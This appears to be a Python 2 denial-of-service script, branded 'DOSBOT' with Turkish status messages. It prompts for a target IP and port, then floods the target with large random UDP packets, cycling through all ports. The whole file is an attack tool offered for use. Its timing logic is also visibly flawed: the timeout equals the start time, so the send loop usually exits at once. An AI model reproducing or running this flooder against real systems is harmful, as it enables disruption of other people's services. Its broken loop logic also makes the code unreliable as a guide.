import sys;
import os;
import time;
import socket;
import random;
from datetime import datetime;
now = datetime.now();
hour = now.hour;
minute = now.minute;
day = now.day;
month = now.month;
year = now.year;

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
bytes = random._urandom(10000);
timeout =  time.time();
os.system ("clear");
print ('''
\033[91m
_____   ____   _____ ____   ____ _______ 
 |  __ \ / __ \ / ____|  _ \ / __ \__   __|
 | |  | | |  | | (___ | |_) | |  | | | |   
 | |  | | |  | |\___ \|  _ <| |  | | | |   
 | |__| | |__| |____) | |_) | |__| | | |   
 |_____/ \____/|_____/|____/ \____/  |_|
''');

ip = raw_input("IP: ");
port = input("Port: ");

os.system("clear");
sent = 0;
while True:
  while 1:
    if time.time() > timeout:
      break;
    else:
      pass;
    sock.sendto(bytes, (ip,port));
    sent = sent + 1;
    port = port + 1;
    print "\033[92m%s. paket, %s adresine; %s portuyla gönderildi"%(sent,ip,port);
    if port == 65534:
      port = 1;
